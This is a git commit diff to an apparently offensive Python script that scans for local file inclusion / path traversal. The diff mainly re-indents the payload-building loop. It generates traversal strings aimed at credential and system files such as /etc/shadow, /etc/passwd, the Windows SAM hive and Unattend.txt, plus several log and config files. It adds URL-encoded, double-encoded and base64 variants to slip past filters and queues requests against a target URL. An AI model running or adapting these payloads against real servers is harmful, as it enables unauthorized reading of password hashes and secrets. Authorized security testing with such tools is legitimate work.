44c3510f34b01496c4c63274f40afdcbed1aa2bc
Ket_ch0p <96146875+Tomatotech90@users.noreply.github.com>
2023-04-23 22:01:19 -0400

    Update LFI_Tra.py

--- LFI_Tra.py
+++ LFI_Tra.py
@@ -32,54 +32,57 @@ async def main(url, max_depth, sleep_interval, headers, proxy):
         for depth in range(1, max_depth + 1):
             patterns = ['../', '..//', '..\\', '..\\\\']
 
-         for pattern in patterns:
-            base_payload = pattern * depth
+            for pattern in patterns:
+                base_payload = pattern * depth
 
-            # Generate payloads for different file paths
-           payloads = [
-    f'{base_payload}etc/passwd',
-    f'{base_payload}etc/shadow',
-    f'{base_payload}etc/group',
-    f'{base_payload}etc/hosts',
-    f'{base_payload}etc/apache2/apache2.conf',
-    f'{base_payload}etc/httpd/conf/httpd.conf',
-    f'{base_payload}etc/nginx/nginx.conf',
-    f'{base_payload}etc/nginx/sites-available/default',
-    f'{base_payload}etc/mysql/my.cnf',
-    f'{base_payload}etc/php/7.0/fpm/php.ini',
-    f'{base_payload}etc/php/7.0/cli/php.ini',
-    f'{base_payload}etc/php/7.2/fpm/php.ini',
-    f'{base_payload}etc/php/7.2/cli/php.ini',
-    f'{base_payload}etc/php/7.4/fpm/php.ini',
-    f'{base_payload}etc/php/7.4/cli/php.ini',
-    f'{base_payload}etc/php/8.0/fpm/php.ini',
-    f'{base_payload}etc/php/8.0/cli/php.ini',
-    f'{base_payload}var/log/auth.log',
-    f'{base_payload}var/log/apache2/access.log',
-    f'{base_payload}var/log/apache2/error.log',
-    f'{base_payload}var/log/nginx/access.log',
-    f'{base_payload}var/log/nginx/error.log',
-    f'{base_payload}var/log/mysql/error.log',
-    f'{base_payload}Windows/win.ini',
-    f'{base_payload}Windows/System32/drivers/etc/hosts',
-    f'{base_payload}Windows/System32/config/SAM',
-    f'{base_payload}Windows/repair/SAM',
-    f'{base_payload}Windows/Panther/Unattend.txt',
-    f'{base_payload}Windows/Panther/Unattended.xml',
-    f'{base_payload}Windows/debug/NetSetup.log'
-]
+                # Generate payloads for different file paths
+                payloads = [
+                           f'{base_payload}etc/passwd',
+                           f'{base_payload}etc/shadow',
+                           f'{base_payload}etc/group',
+                           f'{base_payload}etc/hosts',
+                           f'{base_payload}etc/apache2/apache2.conf',
+                           f'{base_payload}etc/httpd/conf/httpd.conf',
+                           f'{base_payload}etc/nginx/nginx.conf',
+                           f'{base_payload}etc/nginx/sites-available/default',
+                           f'{base_payload}etc/mysql/my.cnf',
+                           f'{base_payload}etc/php/7.0/fpm/php.ini',
+                           f'{base_payload}etc/php/7.0/cli/php.ini',
+                           f'{base_payload}etc/php/7.2/fpm/php.ini',
+                           f'{base_payload}etc/php/7.2/cli/php.ini',
+                           f'{base_payload}etc/php/7.4/fpm/php.ini',
+                           f'{base_payload}etc/php/7.4/cli/php.ini',
+                           f'{base_payload}etc/php/8.0/fpm/php.ini',
+                           f'{base_payload}etc/php/8.0/cli/php.ini',
+                           f'{base_payload}var/log/auth.log',
+                           f'{base_payload}var/log/apache2/access.log',
+                           f'{base_payload}var/log/apache2/error.log',
+                           f'{base_payload}var/log/nginx/access.log',
+                           f'{base_payload}var/log/nginx/error.log',
+                            f'{base_payload}var/log/mysql/error.log',
+                           f'{base_payload}Windows/win.ini',
+                           f'{base_payload}Windows/System32/drivers/etc/hosts',
+                           f'{base_payload}Windows/System32/config/SAM',
+                           f'{base_payload}Windows/repair/SAM',
+                           f'{base_payload}Windows/Panther/Unattend.txt',
+                           f'{base_payload}Windows/Panther/Unattended.xml',
+                           f'{base_payload}Windows/debug/NetSetup.log'
+                           ]
 
+                    # Add the payloads from the previous response here
+                
 
-          # Add the obfuscated payloads
-        url_encoded_payloads = [quote(payload) for payload in payloads]
-        double_url_encoded_payloads = [quote(quote(payload)) for payload in payloads]
-        base64_encoded_payloads = [f"data:text/plain;base64,{b64encode(payload.encode()).decode()}" for payload in payloads]
+                # Add the obfuscated payloads
+                url_encoded_payloads = [quote(payload) for payload in payloads]
+                double_url_encoded_payloads = [quote(quote(payload)) for payload in payloads]
+                base64_encoded_payloads = [f"data:text/plain;base64,{b64encode(payload.encode()).decode()}" for payload in payloads]
 
-        all_payloads = payloads + url_encoded_payloads + double_url_encoded_payloads + base64_encoded_payloads
+                all_payloads = payloads + url_encoded_payloads + double_url_encoded_payloads + base64_encoded_payloads
 
-        tasks.extend([test_payload(session, url, payload) for payload in all_payloads])
-            # Sleep between requests to prevent overwhelming the target server
-            await asyncio.sleep(sleep_interval)
+                tasks.extend([test_payload(session, url, payload) for payload in all_payloads])
+                
+                # Sleep between requests to prevent overwhelming the target server
+                await asyncio.sleep(sleep_interval)
 
         if proxy:
             # Using a proxy
